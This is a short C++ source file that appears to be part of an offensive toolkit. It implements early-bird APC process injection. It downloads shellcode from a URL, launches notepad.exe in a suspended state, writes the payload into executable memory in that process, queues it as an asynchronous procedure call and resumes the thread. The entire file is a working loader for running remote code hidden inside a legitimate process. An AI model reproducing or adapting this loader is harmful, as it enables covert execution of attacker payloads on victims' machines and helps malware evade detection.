#include "..\..\Public.hpp"

void runShellcode()
{
	std::string shellcode = GetShellcodeFromUrl();

	if (shellcode.size() > 0)
	{
		STARTUPINFOA si = { 0 };
		PROCESS_INFORMATION pi = { 0 };
		CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
		HANDLE victimProcess = pi.hProcess;
		HANDLE threadHandle = pi.hThread;
		LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READ);
		PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
		WriteProcessMemory(victimProcess, shellAddress, shellcode.c_str(), shellcode.size(), NULL);
		QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
		ResumeThread(threadHandle);
	}
}

int main()
{
	runShellcode();
	return 0;
}